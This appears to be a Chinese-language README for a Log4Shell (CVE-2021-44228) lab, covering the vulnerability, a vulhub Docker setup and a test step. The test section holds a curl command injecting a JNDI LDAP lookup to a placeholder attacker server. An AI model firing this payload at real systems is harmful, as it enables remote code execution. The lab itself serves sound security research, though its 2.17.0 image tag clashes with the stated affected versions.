# Log4j RCE (CVE-2021-44228)

## 漏洞简介

Apache Log4j2 JNDI 远程代码执行漏洞，又称 Log4Shell，是近年来最严重的漏洞之一。攻击者可以利用 Log4j 的日志记录功能，通过构造特殊的日志消息来触发 JNDI 远程加载，从而执行任意代码。

## CVE 信息

- **CVE 编号**: CVE-2021-44228
- **漏洞类型**: RCE (远程代码执行)
- **危险等级**: Critical (严重)
- **影响版本**: Log4j 2.0 ~ 2.14.1

## 环境信息

- **镜像**: vulhub/log4j:2.17.0
- **端口**: 8989
- **服务**: Log4j RCE 测试环境

## 使用方法

1. 在云服务器上执行 userdata 脚本
2. 脚本会自动安装 Docker 并启动 Log4j 漏洞环境
3. 访问 `http://<your-ip>:8989` 进行测试

## 测试方法

```bash
# 使用 curl 发送恶意请求
curl -X GET "http://<your-ip>:8989" -H "X-Api-Version: \${jndi:ldap://<your-attacker-server>/Exploit}"
```

## 注意事项

- 此环境仅用于安全研究
- 请在防火墙中限制访问来源
- 测试完成后请及时删除环境

## 参考链接

- [Vulhub Log4j 漏洞环境](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)
- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
